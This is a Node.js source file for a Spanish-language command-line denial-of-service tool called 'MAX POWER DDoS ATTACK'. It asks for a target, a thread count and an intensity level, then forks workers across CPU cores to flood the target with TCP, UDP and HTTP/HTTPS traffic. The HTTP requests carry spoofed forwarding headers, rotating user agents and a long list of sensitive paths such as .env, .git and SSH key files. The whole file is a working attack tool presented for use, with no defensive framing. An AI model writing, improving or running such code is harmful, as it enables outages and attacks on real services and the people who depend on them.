#!/usr/bin/env node
'use strict';

const net = require('net');
const dgram = require('dgram');
const crypto = require('crypto');
const readline = require('readline');
const url = require('url');
const http = require('http');
const https = require('https');
const cluster = require('cluster');
const os = require('os');

const colors = {
    title: "\x1b[1;33m", 
    prompt: "\x1b[1;32m",
    error: "\x1b[1;31m",
    success: "\x1b[1;92m",
    warning: "\x1b[1;93m",
    info: "\x1b[1;96m",
    stat: "\x1b[1;97m",
    highlight: "\x1b[1;95m",
    reset: "\x1b[0m"
};

function calculateDelay(intensity) {
    const delays = {
        'Moderada': 100,
        'Agresiva': 10,
        'Extrema': 1,
        'NUCLEAR': 0
    };
    return delays[intensity] || 10;
}

function generateHTTPRequest(target, secure = false) {
    const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT'];
    const routes = [
        '/', '/home', '/admin', '/dashboard', '/login', '/logout', '/register', '/signup', '/signin',
        '/api', '/api/v1', '/api/v2', '/api/v3', '/graphql', '/rest', '/soap', '/rpc', '/jsonrpc', '/xmlrpc',
        '/wp-admin', '/wp-login.php', '/wp-content', '/wp-includes', '/wordpress', '/joomla', '/drupal', '/magento', '/prestashop',
        '/administrator', '/phpmyadmin', '/mysql', '/dbadmin', '/database', '/pma', '/adminer', '/db', '/sql', '/sqlite',
        '/config', '/configuration', '/settings', '/setup', '/install', '/update', '/upgrade', '/maintenance', '/maint', '/install.php',
        '/backup', '/backups', '/backup.zip', '/backup.tar', '/backup.sql', '/back', '/old', '/new', '/temp', '/tmp',
        '/.env', '/.git', '/.svn', '/.hg', '/.bzr', '/.htaccess', '/.htpasswd', '/.well-known', '/.well-known/acme-challenge', '/.well-known/pki-validation',
        '/aws.yml', '/docker-compose.yml', '/dockerfile', '/env', '/environment', '/config.json', '/config.php', '/configuration.yml', '/settings.ini', '/config.ini',
        '/v1', '/v2', '/v3', '/latest', '/current', '/staging', '/dev', '/development', '/test', '/testing',
        '/users', '/accounts', '/profiles', '/dashboard', '/console', '/shell', '/cmd', '/command', '/cli', '/terminal',
        '/internal', '/secure', '/private', '/secret', '/confidential', '/hidden', '/protected', '/auth', '/authentication', '/oauth',
        '/payment', '/payments', '/checkout', '/billing', '/invoice', '/cart', '/shop', '/store', '/ecommerce', '/products',
        '/search', '/find', '/query', '/filter', '/select', '/browse', '/explore', '/discover', '/list', '/catalog',
        '/public', '/static', '/assets', '/images', '/img', '/pictures', '/photos', '/media', '/uploads', '/downloads',
        '/javascript', '/js', '/stylesheets', '/css', '/fonts', '/webfonts', '/icons', '/svg', '/png', '/jpg',
        '/documentation', '/help', '/support', '/faq', '/contact', '/about', '/info', '/status', '/health', '/ping',
        '/actuator', '/actuator/health', '/actuator/info', '/actuator/metrics', '/actuator/env', '/actuator/beans', '/actuator/mappings', '/actuator/threaddump', '/actuator/heapdump', '/actuator/configprops',
        '/phpinfo.php', '/info.php', '/test.php', '/debug.php', '/console.php', '/phpinfo', '/xdebug', '/debug', '/trace', '/logs',
        '/.git/config', '/.git/HEAD', '/.git/logs/HEAD', '/.git/index', '/.git/objects', '/.git/refs', '/.git/hooks', '/.git/info', '/.git/description', '/.gitignore',
        '/.idea', '/.vscode', '/.DS_Store', '/Thumbs.db', '/desktop.ini', '/composer.lock', '/package.json', '/package-lock.json', '/yarn.lock', '/bower.json',
        '/crossdomain.xml', '/clientaccesspolicy.xml', '/robots.txt', '/sitemap.xml', '/sitemap', '/sitemap_index.xml', '/sitemap1.xml', '/sitemap2.xml', '/sitemap3.xml', '/sitemap4.xml',
        '/.ssh', '/.ssh/authorized_keys', '/.ssh/id_rsa', '/.ssh/id_rsa.pub', '/.ssh/known_hosts', '/.ssh/config', '/.ssh/identity', '/.ssh/identity.pub', '/.ssh/id_dsa', '/.ssh/id_dsa.pub',
        '/.npmrc', '/.yarnrc', '/.env.local', '/.env.production', '/.env.development', '/.env.test', '/.env.staging', '/.env.example', '/.env.sample', '/env.example',
        '/backup_config.php', '/backup_settings.php', '/backup_db.php', '/backup_sql.php', '/db_backup.sql', '/database.sql', '/dump.sql', '/export.sql', '/import.sql', '/migrate.sql',
        '/wp-config.php', '/wp-config.bak', '/wp-config.old', '/wp-config.txt', '/wp-config-sample.php', '/configuration.php', '/config.php.bak', '/config.php.old', '/config.php.save', '/config.php~',
        '/appsettings.json', '/app.config', '/web.config', '/application.yml', '/application.properties', '/application.cfg', '/settings.cfg', '/config.cfg', '/setup.cfg', '/system.cfg',
        '/vendor', '/node_modules', '/bower_components', '/composer', '/vendor.php', '/vendors', '/dependencies', '/lib', '/libs', '/library',
        '/cgi-bin', '/cgi', '/scripts', '/bin', '/binaries', '/exe', '/executables', '/sh', '/bash', '/shell',
        '/storage', '/storage/files', '/storage/backups', '/storage/logs', '/storage/app', '/storage/framework', '/storage/cache', '/storage/sessions', '/storage/views', '/storage/uploads',
        '/logs', '/error.log', '/access.log', '/debug.log', '/server.log', '/system.log', '/application.log', '/security.log', '/auth.log', '/error_log',
        '/temp', '/temporary', '/cache', '/cached', '/tmp', '/tmp_files', '/tmp_upload', '/temp_upload', '/cache_files', '/session',
        '/_api', '/_rest', '/_graphql', '/_soap', '/_xmlrpc', '/_internal', '/_private', '/_secure', '/_hidden', '/_protected',
        '/old_site', '/new_site', '/previous', '/legacy', '/archive', '/historical', '/v0', '/beta', '/alpha', '/rc',
        '/management', '/manager', '/director', '/control', '/console_admin', '/sysadmin', '/root', '/superuser', '/webmaster', '/operator',
        '/filemanager', '/fileadmin', '/fileupload', '/filedownload', '/filebrowser', '/explorer', '/browser', '/viewer', '/editor', '/upload',
        '/service', '/services', '/api_gateway', '/gateway', '/proxy', '/reverse_proxy', '/loadbalancer', '/balancer', '/cluster', '/server',
        '/monitoring', '/monitor', '/statuspage', '/healthcheck', '/readiness', '/liveness', '/metrics', '/prometheus', '/grafana', '/kibana',
        '/.aws', '/.azure', '/.gcloud', '/.kube', '/.docker', '/.vagrant', '/.terraform', '/.serverless', '/.github', '/.gitlab',
        '/swagger', '/swagger-ui', '/swagger.json', '/swagger.yaml', '/openapi', '/openapi.json', '/redoc', '/docs', '/documentation', '/api-docs',
        '/oauth2', '/openid', '/saml', '/jwt', '/token', '/keys', '/certs', '/certificates', '/authorize', '/authenticate',
        '/payment_gateway', '/stripe', '/paypal', '/braintree', '/checkout_process', '/checkout_success', '/checkout_failure', '/billing_info', '/payment_methods', '/invoices',
        '/search_results', '/advanced_search', '/query_results', '/filters', '/browse_category', '/browse_all', '/discover_new', '/trending', '/popular', '/recommended',
        '/public_files', '/static_content', '/asset_management', '/image_gallery', '/photo_album', '/media_library', '/upload_form', '/download_center', '/content_delivery', '/cdn',
        '/js_libs', '/css_frameworks', '/font_assets', '/icon_set', '/svg_icons', '/png_assets', '/jpg_resources', '/webp_images', '/media_files', '/multimedia',
        '/help_center', '/support_tickets', '/faq_section', '/contact_us', '/about_us', '/company_info', '/team', '/careers', '/privacy', '/terms',
        '/health_status', '/server_status', '/performance', '/uptime', '/metrics_data', '/analytics', '/stats', '/usage', '/reports', '/diagnostics',
        '/old_version', '/new_version', '/legacy_system', '/archive_data', '/historical_records', '/v0_api', '/beta_test', '/alpha_release', '/release_candidate', '/stable',
        '/sysadmin_tools', '/root_access', '/superuser_panel', '/webmaster_tools', '/operator_console', '/control_panel', '/director_access', '/management_console', '/admin_tools', '/system_administration',
        '/file_management', '/content_upload', '/download_manager', '/browse_files', '/explore_content', '/view_documents', '/edit_content', '/upload_interface', '/download_portal', '/file_repository',
        '/service_endpoint', '/api_services', '/gateway_access', '/proxy_server', '/reverse_proxy_config', '/load_balancer', '/cluster_management', '/server_status', '/service_health', '/api_health',
        '/monitoring_tools', '/status_monitor', '/health_dashboard', '/readiness_check', '/liveness_check', '/metrics_endpoint', '/prometheus_data', '/grafana_dashboard', '/kibana_logs', '/elasticsearch',
        '/aws_config', '/azure_settings', '/gcloud_config', '/kube_config', '/docker_setup', '/vagrant_config', '/terraform_state', '/serverless_config', '/github_settings', '/gitlab_config',
        '/swagger_docs', '/openapi_spec', '/redoc_documentation', '/api_documentation', '/developer_portal', '/api_explorer', '/sandbox', '/test_console', '/interactive_docs', '/reference',
        '/vpn_config', '/vpn_settings', '/vpn_status', '/vpn_connect', '/vpn_disconnect', '/vpn_logs', '/vpn_diagnostics', '/vpn_management', '/vpn_admin', '/vpn_dashboard',
        '/cms_admin', '/cms_dashboard', '/cms_content', '/cms_media', '/cms_templates', '/cms_plugins', '/cms_themes', '/cms_settings', '/cms_update', '/cms_backup',
        '/erp_dashboard', '/erp_inventory', '/erp_sales', '/erp_purchasing', '/erp_accounting', '/erp_hr', '/erp_reporting', '/erp_settings', '/erp_integration', '/erp_backup',
        '/crm_dashboard', '/crm_contacts', '/crm_leads', '/crm_opportunities', '/crm_activities', '/crm_reports', '/crm_settings', '/crm_integration', '/crm_import', '/crm_export',
        '/bi_dashboard', '/bi_reports', '/bi_analytics', '/bi_datasets', '/bi_visualization', '/bi_scheduling', '/bi_sharing', '/bi_settings', '/bi_integration', '/bi_export',
        '/iot_dashboard', '/iot_devices', '/iot_sensors', '/iot_controls', '/iot_analytics', '/iot_alerts', '/iot_settings', '/iot_integration', '/iot_firmware', '/iot_logs',
        '/ai_endpoint', '/ai_model', '/ai_prediction', '/ai_training', '/ai_dashboard', '/ai_analytics', '/ai_settings', '/ai_documentation', '/ai_examples', '/ai_sandbox',
        '/blockchain_explorer', '/blockchain_transactions', '/blockchain_wallets', '/blockchain_contracts', '/blockchain_settings', '/blockchain_dashboard', '/blockchain_api', '/blockchain_docs', '/blockchain_status', '/blockchain_nodes',
        '/game_api', '/game_assets', '/game_config', '/game_leaderboard', '/game_analytics', '/game_settings', '/game_admin', '/game_update', '/game_backup', '/game_logs',
        '/mobile_api', '/mobile_config', '/mobile_push', '/mobile_analytics', '/mobile_settings', '/mobile_admin', '/mobile_backend', '/mobile_docs', '/mobile_status', '/mobile_logs',
        '/microservice_a', '/microservice_b', '/microservice_c', '/microservice_d', '/microservice_e', '/service_registry', '/config_server', '/api_gateway_service', '/auth_service', '/logging_service',
        '/legacy_api', '/deprecated_api', '/sunset_api', '/retired_api', '/obsolete_api', '/old_api', '/new_api', '/experimental_api', '/unstable_api', '/stable_api',
        '/internal_tool_a', '/internal_tool_b', '/internal_tool_c', '/employee_portal', '/hr_portal', '/finance_portal', '/it_portal', '/sales_portal', '/support_portal', '/executive_dashboard',
        '/partner_api', '/partner_portal', '/vendor_portal', '/supplier_portal', '/distributor_portal', '/reseller_portal', '/affiliate_portal', '/integration_portal', '/api_partner', '/sdk_download'
    ];
    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.0; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Vivaldi/6.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0',
        'Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Whale/3.22.205.18',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/118.0.5993.88 Chrome/118.0.5993.88 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-T865) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; Redmi Note 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; CPH2173) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; vivo 1935) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SAMSUNG SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SAMSUNG SM-F926B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 17_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPod touch; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.0; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Mozilla/5.0 (X11; FreeBSD amd64; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Mozilla/5.0 (X11; OpenBSD amd64; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Mozilla/5.0 (X11; NetBSD amd64; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'curl/8.4.0',
        'Wget/1.21.4',
        'PostmanRuntime/7.36.1',
        'Go-http-client/2.0',
        'Java/17.0.8',
        'python-requests/2.31.0',
        'node-fetch/3.3.1',
        'Ruby',
        'PHP/8.2.10'
    ];
    const contentTypes = [
        'application/json',
        'application/xml',
        'text/html',
        'multipart/form-data',
        'application/x-www-form-urlencoded'
    ];

    const randomMethod = methods[Math.floor(Math.random() * methods.length)];
    const randomRoute = routes[Math.floor(Math.random() * routes.length)];
    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
    const randomContentType = contentTypes[Math.floor(Math.random() * contentTypes.length)];
    const randomIP = Array.from({length: 4}, () => Math.floor(Math.random() * 256)).join('.');
    const randomParams = crypto.randomBytes(24).toString('hex');
    const body = randomMethod !== 'GET' ? crypto.randomBytes(1024).toString('hex') : '';

    const headers = [
        `Host: ${target}`,
        `User-Agent: ${randomUserAgent}`,
        'Accept: */*',
        'Accept-Language: en-US,en;q=0.9',
        'Connection: keep-alive',
        'Cache-Control: no-cache, no-store, must-revalidate',
        `X-Forwarded-For: ${randomIP}`,
        `X-Real-IP: ${randomIP}`,
        `Content-Type: ${randomContentType}`,
        `Referer: https://${target}${routes[Math.floor(Math.random() * routes.length)]}`,
        `Content-Length: ${body.length}`
    ];

    return Buffer.from([
        `${randomMethod} ${randomRoute}?${randomParams} HTTP/1.1`,
        ...headers,
        '',
        body
    ].join('\r\n'));
}

function generatePayloads(target) {
    return {
        TCP: crypto.randomBytes(4096),
        UDP: crypto.randomBytes(4096),
        HTTP: generateHTTPRequest(target, false),
        HTTPS: generateHTTPRequest(target, true)
    };
}

class DDoSAttackMaxPower {
    constructor() {
        this.stats = {
            total: 0,
            success: 0,
            failed: 0,
            bandwidth: 0,
            methods: { TCP: 0, UDP: 0, HTTP: 0, HTTPS: 0 }
        };
        this.workers = [];
        this.methods = ['TCP', 'UDP', 'HTTP', 'HTTPS'];
        this.startTime = Date.now();
        this.statsInterval = null;
        this.rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });
    }

    async ask(question) {
        return new Promise((resolve) => {
            this.rl.question(question, (answer) => {
                resolve(answer);
            });
        });
    }

    async numberBetween(question, min, max) {
        while (true) {
            const input = await this.ask(question);
            const number = parseInt(input);
            
            if (!isNaN(number) && number >= min && number <= max) {
                return number;
            }
            console.log(`${colors.error}Valor inválido. Debe ser entre ${min}-${max}${colors.reset}`);
        }
    }

    async resolveTarget(targetInput) {
        try {
            let parsed;
            if (!targetInput.includes('://')) {
                targetInput = 'http://' + targetInput;
            }
            
            parsed = new url.URL(targetInput);
            const host = parsed.hostname;
            let port = parsed.port;
            const protocol = parsed.protocol.replace(':', '');

            if (!port) {
                port = protocol === 'https' ? 443 : 80;
            }

            return { host, port: parseInt(port), protocol };
        } catch (error) {
            console.log(`${colors.error}URL inválida: ${error.message}${colors.reset}`);
            return this.resolveTarget(await this.ask(`${colors.prompt}Ingrese objetivo nuevamente: ${colors.reset}`));
        }
    }

    async start() {
        console.log(`${colors.title}\n[ MAX POWER DDoS ATTACK ]${colors.reset}\n`);
        
        const target = await this.ask(`${colors.prompt}Objetivo (URL/IP): ${colors.reset}`);
        const { host, port, protocol } = await this.resolveTarget(target);
        const threads = await this.numberBetween(`${colors.prompt}Hilos (5000-100000): ${colors.reset}`, 5000, 100000);
        const duration = await this.numberBetween(`${colors.prompt}Duración (minutos): ${colors.reset}`, 1, 1440);
        const intensity = await this.selectIntensity();

        console.log(`${colors.info}\n- Objetivo: ${host}:${port}${colors.reset}`);
        console.log(`${colors.info}- Protocolo: ${protocol.toUpperCase()}${colors.reset}`);
        console.log(`${colors.info}- Hilos: ${threads.toLocaleString('es')}${colors.reset}`);
        console.log(`${colors.info}- Duración: ${duration} minutos${colors.reset}`);
        console.log(`${colors.info}- Intensidad: ${intensity}${colors.reset}`);

        this.startAttack(host, port, threads, intensity);
        this.showStats();
        setTimeout(() => this.stop(), duration * 60000);
    }

    async selectIntensity() {
        console.log(`\n${colors.info}Nivel de intensidad:${colors.reset}`);
        console.log(`${colors.warning}1. Moderada${colors.reset}`);
        console.log(`${colors.warning}2. Agresiva${colors.reset}`);
        console.log(`${colors.warning}3. Extrema${colors.reset}`);
        console.log(`${colors.warning}4. NUCLEAR${colors.reset}\n`);

        while (true) {
            const choice = await this.ask(`${colors.prompt}Selección: ${colors.reset}`);
            const level = parseInt(choice);
            if ([1, 2, 3, 4].includes(level)) {
                return ['Moderada', 'Agresiva', 'Extrema', 'NUCLEAR'][level - 1];
            }
            console.log(`${colors.error}Opción inválida. Ingrese 1-4${colors.reset}`);
        }
    }

    startAttack(target, port, threads, intensity) {
        if (cluster.isPrimary) {
            const cores = Math.max(1, Math.min(os.cpus().length, 64));
            console.log(`${colors.info}Iniciando ataque con ${cores} núcleos de CPU...${colors.reset}`);
            
            const workerData = { target, port, intensity, threads };
            
            for (let i = 0; i < cores; i++) {
                const worker = cluster.fork({ workerData: JSON.stringify(workerData) });
                
                worker.on('message', (msg) => {
                    this.stats.total += msg.total || 0;
                    this.stats.success += msg.success || 0;
                    this.stats.failed += msg.failed || 0;
                    this.stats.bandwidth += msg.bandwidth || 0;
                    if (msg.method) this.stats.methods[msg.method] += msg.count || 0;
                });
            }

            cluster.on('exit', (worker) => {
                console.log(`${colors.warning}Worker ${worker.process.pid} caído, reiniciando...${colors.reset}`);
                cluster.fork({ workerData: JSON.stringify(workerData) });
            });
        } else {
            const workerData = JSON.parse(process.env.workerData);
            const { target, port, intensity, threads } = workerData;
            const delay = calculateDelay(intensity);
            const payloads = generatePayloads(target);
            const connectionsPerWorker = Math.ceil(threads / os.cpus().length);
            
            // Iniciar ataques
            this.startWorkerAttacks(target, port, intensity, payloads, delay, connectionsPerWorker);
        }
    }

    startWorkerAttacks(target, port, intensity, payloads, delay, connections) {
        for (let i = 0; i < connections; i++) {
            const method = this.methods[Math.floor(Math.random() * this.methods.length)];
            
            switch (method) {
                case 'TCP':
                    this.startTCPAttack(target, port, payloads, delay);
                    break;
                case 'UDP':
                    this.startUDPAttack(target, port, payloads, delay);
                    break;
                case 'HTTP':
                    this.startHTTPAttack(target, port, false, delay);
                    break;
                case 'HTTPS':
                    this.startHTTPAttack(target, port, true, delay);
                    break;
            }
        }
    }

    startTCPAttack(target, port, payloads, delay) {
        let stats = { total: 0, success: 0, failed: 0, bandwidth: 0 };
        
        const sendStats = () => {
            process.send({ 
                method: 'TCP',
                total: stats.total,
                success: stats.success,
                failed: stats.failed,
                bandwidth: stats.bandwidth
            });
            stats = { total: 0, success: 0, failed: 0, bandwidth: 0 };
        };
        
        setInterval(sendStats, 1000);

        const attack = () => {
            const socket = new net.Socket();
            
            socket.connect(port, target, () => {
                const sendData = () => {
                    try {
                        socket.write(payloads.TCP);
                        stats.bandwidth += payloads.TCP.length;
                        stats.success++;
                        stats.total++;
                        
                        if (delay > 0) {
                            setTimeout(sendData, delay);
                        } else {
                            setImmediate(sendData);
                        }
                    } catch (e) {
                        stats.failed++;
                        stats.total++;
                        socket.destroy();
                        setTimeout(attack, 1000);
                    }
                };
                sendData();
            });

            socket.on('error', (e) => {
                stats.failed++;
                stats.total++;
                socket.destroy();
                setTimeout(attack, 1000);
            });

            socket.on('timeout', () => {
                stats.failed++;
                stats.total++;
                socket.destroy();
                setTimeout(attack, 1000);
            });
        };
        
        attack();
    }

    startUDPAttack(target, port, payloads, delay) {
        let stats = { total: 0, success: 0, failed: 0, bandwidth: 0 };
        
        const sendStats = () => {
            process.send({ 
                method: 'UDP',
                total: stats.total,
                success: stats.success,
                failed: stats.failed,
                bandwidth: stats.bandwidth
            });
            stats = { total: 0, success: 0, failed: 0, bandwidth: 0 };
        };
        
        setInterval(sendStats, 1000);

        const socket = dgram.createSocket('udp4');
        const message = payloads.UDP;
        
        const sendPacket = () => {
            socket.send(message, 0, message.length, port, target, (err) => {
                if (err) {
                    stats.failed++;
                    stats.total++;
                    socket.close();
                    setTimeout(() => {
                        this.startUDPAttack(target, port, payloads, delay);
                    }, 1000);
                } else {
                    stats.success++;
                    stats.total++;
                    stats.bandwidth += message.length;
                    setTimeout(sendPacket, delay);
                }
            });
        };
        
        sendPacket();
    }

    startHTTPAttack(target, port, secure, delay) {
        let stats = { total: 0, success: 0, failed: 0, bandwidth: 0 };
        const method = secure ? 'HTTPS' : 'HTTP';
        
        const sendStats = () => {
            process.send({ 
                method: method,
                total: stats.total,
                success: stats.success,
                failed: stats.failed,
                bandwidth: stats.bandwidth
            });
            stats = { total: 0, success: 0, failed: 0, bandwidth: 0 };
        };
        
        setInterval(sendStats, 1000);

        const protocol = secure ? https : http;
        
        const makeRequest = () => {
            const options = {
                hostname: target,
                port: port,
                method: 'GET',
                path: `/?${crypto.randomBytes(8).toString('hex')}`,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache'
                },
                timeout: 5000
            };
            
            const req = protocol.request(options, (res) => {
                stats.success++;
                stats.total++;
                res.on('data', () => {});
                res.on('end', () => {
                    setTimeout(makeRequest, delay);
                });
            });
            
            req.on('error', (e) => {
                stats.failed++;
                stats.total++;
                setTimeout(makeRequest, delay);
            });
            
            req.on('timeout', () => {
                stats.failed++;
                stats.total++;
                req.destroy();
                setTimeout(makeRequest, delay);
            });
            
            req.end();
        };
        
        makeRequest();
    }

    showStats() {
        const render = () => {
            const elapsed = (Date.now() - this.startTime) / 1000;
            const minutes = Math.floor(elapsed / 60);
            const seconds = Math.floor(elapsed % 60);
            const rps = elapsed > 0 ? (this.stats.total / elapsed).toFixed(0) : 0;
            const bw = (this.stats.bandwidth / (1024 ** 2)).toFixed(2);
            const successRate = this.stats.total > 0 
                ? ((this.stats.success / this.stats.total) * 100).toFixed(1) 
                : '0.0';

            process.stdout.write('\x1Bc'); // Limpiar pantalla
            console.log(`${colors.title}\n[ MAX POWER DDoS ATTACK ]${colors.reset}\n`);
            
            const statsDisplay = [
                `${colors.highlight}Tiempo: ${minutes}m ${seconds}s${colors.reset}`,
                `${colors.stat}Req: ${colors.info}${this.stats.total.toLocaleString('es')}${colors.reset}`,
                `${colors.stat}Éxito: ${colors.success}${this.stats.success.toLocaleString('es')}${colors.reset}`,
                `${colors.stat}Fallos: ${colors.error}${this.stats.failed.toLocaleString('es')}${colors.reset}`,
                `${colors.stat}Tasa: ${colors.warning}${successRate}%${colors.reset}`,
                `${colors.stat}RPS: ${colors.highlight}${Number(rps).toLocaleString('es')}/s${colors.reset}`,
                `${colors.stat}BW: ${colors.info}${bw} MB/s${colors.reset}`
            ].join('\n');

            console.log(statsDisplay + '\n');
        };

        this.statsInterval = setInterval(render, 1000);
        render();
    }

    stop() {
        clearInterval(this.statsInterval);
        console.log(`\n\n${colors.success}Ataque detenido después de ${((Date.now() - this.startTime) / 60000).toFixed(1)} minutos${colors.reset}`);
        console.log(`${colors.stat}Resumen final:`);
        console.log(`${colors.stat}- Total de peticiones: ${this.stats.total.toLocaleString('es')}`);
        console.log(`${colors.stat}- Peticiones exitosas: ${this.stats.success.toLocaleString('es')}`);
        console.log(`${colors.stat}- Peticiones fallidas: ${this.stats.failed.toLocaleString('es')}`);
        console.log(`${colors.stat}- Ancho de banda usado: ${(this.stats.bandwidth / (1024 ** 2)).toFixed(2)} MB${colors.reset}`);
        
        if (cluster.isPrimary) {
            for (const id in cluster.workers) {
                cluster.workers[id].kill();
            }
        }
        
        this.rl.close();
        process.exit(0);
    }
}

// Iniciar la aplicación
if (cluster.isPrimary) {
    const attack = new DDoSAttackMaxPower();
    attack.start();
}